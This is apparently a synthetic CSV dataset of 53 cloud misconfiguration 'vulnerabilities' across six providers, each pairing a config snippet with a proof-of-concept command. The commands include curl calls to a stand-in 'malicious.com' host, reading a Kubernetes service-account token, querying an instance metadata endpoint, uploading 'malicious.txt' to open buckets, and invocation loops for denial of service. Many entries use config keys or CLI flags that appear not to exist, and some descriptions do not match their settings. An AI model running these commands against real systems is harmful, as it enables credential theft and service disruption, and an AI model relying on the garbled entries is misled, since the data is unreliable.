id,description,category,cloud_provider,vulnerable_code,poc,source,timestamp
VUL801,AWS ECS with misconfigured IAM role allowing privilege escalation.,Privilege Escalation,AWS,"{ ""taskRoleArn"": ""arn:aws:iam::account:role/admin-role"" }",aws sts get-caller-identity --profile ecs-task,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/ecs'}",2025-06-19T11:44:00Z
VUL802,Azure Function with misconfigured authentication allowing unauthorized access.,Authentication,Azure,"{ ""authLevel"": ""anonymous"" }",curl https://function-app.azurewebsites.net/api/function,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-functions'}",2025-06-19T11:44:00Z
VUL803,GCP Cloud Run with misconfigured timeout allowing resource exhaustion.,Denial of Service,GCP,gcloud run deploy service --image image --timeout=3600,curl https://service-region.run.app?delay=3600,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:44:00Z
VUL804,Oracle Cloud Compute with misconfigured VNIC allowing traffic interception.,Network Security,Oracle Cloud,"{ ""vnicConfig"": { ""publicIp"": true } }",tcpdump -i eth0 host vnic-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:44:00Z
VUL805,IBM Cloud Object Storage with misconfigured bucket policy allowing data tampering.,Data Exposure,IBM Cloud,"{ ""bucketPolicy"": { ""Statement"": [{ ""Action"": ""PutObject"", ""Principal"": ""*"" }] } }",curl -X PUT https://s3.bucket/malicious.txt --data-binary @malicious.txt,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/cloud-object-storage'}",2025-06-19T11:44:00Z
VUL806,Alibaba Cloud SLB with misconfigured SSL cipher allowing weak encryption.,Encryption,Alibaba Cloud,"{ ""SSLCipherPolicy"": { ""Ciphers"": [""TLS_RSA_WITH_3DES_EDE_CBC_SHA""] } }",nmap --script ssl-enum-ciphers -p 443 slb-ip,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/27595.htm'}",2025-06-19T11:44:00Z
VUL807,AWS S3 bucket with misconfigured replication exposing data.,Data Exposure,AWS,"{ ""ReplicationConfiguration"": { ""Rules"": [{ ""Destination"": { ""Bucket"": ""public-bucket"" } }] } }",aws s3 ls s3://public-bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:44:00Z
VUL808,Azure SQL Database with misconfigured auditing exposing sensitive queries.,Data Exposure,Azure,"{ ""auditingSettings"": { ""storageEndpoint"": ""public-storage"" } }",curl https://storage-account.blob.core.windows.net/container/audit-logs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/azure-sql'}",2025-06-19T11:44:00Z
VUL809,GCP Cloud Functions with misconfigured IAM policy allowing unauthorized invocation.,Access Control,GCP,gcloud functions add-iam-policy-binding fn --member='allUsers' --role='roles/cloudfunctions.invoker',curl https://us-central1-project.cloudfunctions.net/fn,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:44:00Z
VUL810,Oracle Cloud VCN with misconfigured NAT rule allowing data exfiltration.,Data Exfiltration,Oracle Cloud,"{ ""natRules"": [{ ""destination"": ""0.0.0.0/0"", ""protocol"": ""all"" }] }",curl http://malicious.com --interface nat-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:44:00Z
VUL811,IBM Cloud Kubernetes with misconfigured network policy allowing lateral movement.,Network Security,IBM Cloud,"{ ""networkPolicy"": { ""podSelector"": {}, ""policyTypes"": [""Egress""] } }",kubectl exec pod -- curl http://internal-svc,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:44:00Z
VUL812,Alibaba Cloud RDS with misconfigured parameter exposing sensitive data.,Data Exposure,Alibaba Cloud,"{ ""Parameters"": [{ ""ParameterName"": ""log_connections"", ""ParameterValue"": ""ON"" }] }","mysql -h rds-endpoint -u user -p -e 'SHOW VARIABLES LIKE ""log_connections""'","{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:44:00Z
VUL813,AWS API Gateway with misconfigured cache allowing data leakage.,Data Exposure,AWS,"{ ""cacheConfig"": { ""enabled"": true, ""ttlInSeconds"": 3600 } }",curl https://api-id.execute-api.region.amazonaws.com/stage?cache=true,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:44:00Z
VUL814,Azure Cosmos DB with misconfigured indexing policy allowing unauthorized queries.,Access Control,Azure,"{ ""indexingPolicy"": { ""includedPaths"": [{ ""path"": ""/*"" }] } }",curl https://cosmosdb-account.documents.azure.com/dbs/db/colls/coll/docs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cosmos-db'}",2025-06-19T11:44:00Z
VUL815,GCP Cloud Storage with misconfigured lifecycle rule exposing archived data.,Data Exposure,GCP,"gsutil lifecycle set '{""rule"": [{""action"": {""type"": ""SetStorageClass"", ""storageClass"": ""ARCHIVE""}, ""condition"": {""age"": 1}}]}' gs://bucket",gsutil ls -L gs://bucket,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:44:00Z
VUL816,Oracle Cloud Database with misconfigured TDE exposing data.,Encryption,Oracle Cloud,"{ ""tdeConfig"": { ""enabled"": false } }",sqlplus user/pass@db-endpoint:1521/service -e 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/managingDBsystem.htm'}",2025-06-19T11:44:00Z
VUL817,IBM Cloud Functions with misconfigured concurrency allowing DoS attacks.,Denial of Service,IBM Cloud,"{ ""concurrencyLimit"": 1000 }",for i in {1..1000}; do ibmcloud fn action invoke action-name & done,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:44:00Z
VUL818,Alibaba Cloud OSS with misconfigured access policy allowing data tampering.,Data Exposure,Alibaba Cloud,"{ ""AccessControlList"": { ""Grant"": ""public-read-write"" } }",aliyun oss cp malicious.txt oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:44:00Z
VUL819,AWS CloudTrail with misconfigured S3 bucket access allowing log exposure.,Data Exposure,AWS,"{ ""S3BucketPolicy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""s3:GetObject"" }] } }",aws s3 ls s3://cloudtrail-bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/awscloudtrail'}",2025-06-19T11:44:00Z
VUL820,Azure Virtual Machine with misconfigured public IP allowing unauthorized access.,Access Control,Azure,"{ ""publicIpAddress"": { ""sku"": ""Basic"", ""publicIPAddressVersion"": ""IPv4"" } }",nmap -p- vm-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:44:00Z
VUL821,GCP Cloud Functions with misconfigured event trigger allowing unauthorized invocation.,Access Control,GCP,gcloud functions deploy fn --trigger-event providers/cloud.storage/eventTypes/object.change --trigger-resource bucket,gsutil cp trigger.txt gs://bucket,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:44:00Z
VUL822,Oracle Cloud Load Balancer with misconfigured listener allowing protocol downgrade.,Encryption,Oracle Cloud,"{ ""listenerConfig"": { ""protocol"": ""HTTP"", ""port"": 443 } }",curl -k http://lb-ip:443,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:44:00Z
VUL823,IBM Cloud VPC with misconfigured subnet routing allowing traffic interception.,Network Security,IBM Cloud,"{ ""routingTable"": { ""routes"": [{ ""destination"": ""0.0.0.0/0"", ""nextHop"": ""public-gateway"" }] } }",tcpdump -i eth0 host subnet-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:44:00Z
VUL824,Alibaba Cloud ECS with misconfigured metadata endpoint exposing sensitive data.,Data Exposure,Alibaba Cloud,"{ ""MetadataOptions"": { ""HttpEndpoint"": ""enabled"", ""HttpTokens"": ""optional"" } }",curl http://100.100.100.200/latest/meta-data/,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:44:00Z
VUL825,AWS EKS with misconfigured service account token allowing privilege escalation.,Privilege Escalation,AWS,"{ ""serviceAccount"": { ""automountServiceAccountToken"": true } }",kubectl exec pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:44:00Z
VUL826,Azure API Management with misconfigured backend allowing unauthorized access.,Access Control,Azure,"{ ""backendConfig"": { ""authentication"": ""none"" } }",curl https://api-management.azure-api.net/backend,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:44:00Z
VUL827,GCP Cloud SQL with misconfigured backup policy exposing data.,Data Exposure,GCP,gcloud sql instances create instance --backup-location=public-bucket,gsutil ls gs://public-bucket/backups,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:44:00Z
VUL828,Oracle Cloud Identity with misconfigured group policy allowing privilege escalation.,Privilege Escalation,Oracle Cloud,"{ ""groupPolicy"": { ""Statement"": [{ ""Action"": ""manage"", ""Resource"": ""*"" }] } }",oci iam policy list --group-id group-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:44:00Z
VUL829,IBM Cloud Functions with misconfigured rate limiting allowing DoS attacks.,Denial of Service,IBM Cloud,"{ ""rateLimitConfig"": { ""requestsPerSecond"": 10000 } }",for i in {1..10000}; do ibmcloud fn action invoke action-name & done,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:44:00Z
VUL830,Alibaba Cloud OSS with misconfigured bucket versioning allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""VersioningConfiguration"": { ""Status"": ""Enabled"" } }",aliyun oss ls oss://bucket --versions,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:44:00Z
VUL831,AWS SNS with misconfigured delivery policy allowing message loss.,Data Loss,AWS,"{ ""DeliveryPolicy"": { ""retryCount"": 1 } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'test',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:44:00Z
VUL832,Azure Event Hub with misconfigured SAS token allowing unauthorized access.,Access Control,Azure,"{ ""sasTokenConfig"": { ""sharedAccessKey"": ""plain-text-key"" } }",curl https://eventhub-namespace.servicebus.windows.net/hub?api-version=2014-01,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/event-hubs'}",2025-06-19T11:44:00Z
VUL833,GCP BigQuery with misconfigured view access allowing unauthorized queries.,Access Control,GCP,"bq update --set_iam_policy '{""bindings"": [{""role"": ""roles/bigquery.dataViewer"", ""members"": [""allUsers""]}]}' dataset.view",bq query 'SELECT * FROM dataset.view',"{'cve': 'N/A', 'link': 'https://cloud.google.com/bigquery/docs'}",2025-06-19T11:44:00Z
VUL834,Oracle Cloud Object Storage with misconfigured CORS policy allowing data exfiltration.,Data Exfiltration,Oracle Cloud,"{ ""corsRules"": [{ ""allowedOrigins"": [""*""], ""allowedMethods"": [""GET"", ""PUT""] }] }",curl -H 'Origin: http://malicious.com' https://objectstorage.region.oraclecloud.com/n/namespace/b/bucket/o/file.txt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Object/Tasks/managingbuckets.htm'}",2025-06-19T11:44:00Z
VUL835,IBM Cloud Kubernetes with misconfigured pod affinity allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""affinity"": { ""podAffinity"": { ""requiredDuringSchedulingIgnoredDuringExecution"": [] } } }",kubectl create pod --image=busybox --requests='cpu=1000',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:44:00Z
VUL836,Alibaba Cloud ECS with misconfigured instance type allowing resource exhaustion.,Denial of Service,Alibaba Cloud,"{ ""InstanceType"": ""ecs.c6.large"", ""MaxCpu"": 1000 }",aliyun ecs DescribeInstances --InstanceIds instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25378.htm'}",2025-06-19T11:44:00Z
VUL837,AWS CloudFormation with misconfigured stack set allowing unauthorized deployment.,Access Control,AWS,"{ ""StackSetPolicy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""cloudformation:CreateStack"" }] } }",aws cloudformation create-stack --stack-name malicious-stack --template-body file://template.yaml,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/cloudformation'}",2025-06-19T11:44:00Z
VUL838,Azure Machine Learning with misconfigured endpoint allowing inference attacks.,Data Exposure,Azure,"{ ""endpointConfig"": { ""authentication"": ""none"" } }",curl https://ml-workspace.region.api.azureml.ms/score?input=malicious,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/machine-learning'}",2025-06-19T11:44:00Z
VUL839,GCP Cloud Monitoring with misconfigured dashboard exposing sensitive metrics.,Data Exposure,GCP,"gcloud monitoring dashboards create --config='{""widgets"": [{""title"": ""sensitive-metrics"", ""public"": true}]}'",curl https://monitoring.googleapis.com/v1/projects/project/dashboards,"{'cve': 'N/A', 'link': 'https://cloud.google.com/monitoring/docs'}",2025-06-19T11:44:00Z
VUL840,Oracle Cloud Functions with misconfigured IAM policy allowing unauthorized invocation.,Access Control,Oracle Cloud,"{ ""policy"": { ""Statement"": [{ ""Action"": ""fn:invoke"", ""Resource"": ""*"", ""Principal"": ""*"" }] } }",oci fn function invoke --function-id fn-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Functions/Tasks/functions.htm'}",2025-06-19T11:44:00Z
VUL841,IBM Cloud VPC with misconfigured security group allowing unauthorized access.,Access Control,IBM Cloud,"{ ""securityGroupRules"": [{ ""source"": ""0.0.0.0/0"", ""protocol"": ""all"" }] }",nmap -p- sg-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:44:00Z
VUL842,Alibaba Cloud RDS with misconfigured snapshot policy allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""SnapshotPolicy"": { ""publicAccess"": true } }",aliyun rds DescribeBackups --DBInstanceId db-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:44:00Z
VUL843,AWS Redshift with misconfigured cluster parameter group exposing data.,Data Exposure,AWS,"{ ""ParameterGroup"": { ""Parameters"": [{ ""ParameterName"": ""require_ssl"", ""ParameterValue"": ""false"" }] } }",psql -h redshift-endpoint -U user -d db -c 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/redshift'}",2025-06-19T11:44:00Z
VUL844,Azure Data Lake with misconfigured file system access allowing data tampering.,Data Exposure,Azure,"{ ""fileSystemAccess"": { ""permissions"": [{ ""principal"": ""*"", ""access"": ""readWrite"" }] } }",az storage fs file upload --account-name datalake --path malicious.txt,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/data-lake-store'}",2025-06-19T11:44:00Z
VUL845,GCP Cloud Composer with misconfigured environment variable allowing code injection.,Code Injection,GCP,gcloud composer environments create env --env-variables 'SCRIPT=malicious-code',curl https://airflow-ui.composer.region.cloud.google.com/run,"{'cve': 'N/A', 'link': 'https://cloud.google.com/composer/docs'}",2025-06-19T11:44:00Z
VUL846,Oracle Cloud VCN with misconfigured security group allowing lateral movement.,Network Security,Oracle Cloud,"{ ""securityGroupRules"": [{ ""source"": ""0.0.0.0/0"", ""protocol"": ""all"" }] }",nmap -p- vcn-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:44:00Z
VUL847,IBM Cloud Kubernetes with misconfigured resource quota allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""resourceQuota"": { ""limits.cpu"": ""1000"" } }",kubectl create pod --image=busybox --requests='cpu=1000',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:44:00Z
VUL848,Alibaba Cloud OSS with misconfigured bucket encryption policy exposing data.,Encryption,Alibaba Cloud,"{ ""ServerSideEncryptionRule"": { ""SSEAlgorithm"": ""None"" } }",aliyun oss ls oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:44:00Z
VUL849,AWS S3 bucket with misconfigured lifecycle transition exposing archived data.,Data Exposure,AWS,"{ ""LifecycleConfiguration"": { ""Rules"": [{ ""Transition"": { ""StorageClass"": ""GLACIER"", ""Days"": 1 } }] } }",aws s3 ls s3://bucket --include-archived,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:44:00Z
VUL850,Azure Stream Analytics with misconfigured job output allowing data exfiltration.,Data Exfiltration,Azure,"{ ""outputConfig"": { ""type"": ""Blob"", ""access"": ""public"" } }",curl https://storage-account.blob.core.windows.net/container/output-data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/stream-analytics'}",2025-06-19T11:44:00Z
VUL851,GCP Cloud Armor with misconfigured rate limiting allowing DoS attacks.,Denial of Service,GCP,"gcloud compute security-policies create policy --rate-limit-options='{""rateLimitThreshold"": {""count"": 10000}}'",for i in {1..10000}; do curl https://backend-service-ip; done,"{'cve': 'N/A', 'link': 'https://cloud.google.com/armor/docs'}",2025-06-19T11:44:00Z
VUL852,Oracle Cloud File Storage with misconfigured export policy allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""exportPolicy"": { ""source"": ""0.0.0.0/0"", ""access"": ""readWrite"" } }",mount -t nfs fs-endpoint:/export /mnt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:44:00Z
VUL853,IBM Cloud Databases with misconfigured connection pooling exposing credentials.,Data Exposure,IBM Cloud,"{ ""connectionPoolConfig"": { ""credentials"": ""plain-text"" } }",psql -h db-endpoint -U user -d db -c 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:44:00Z
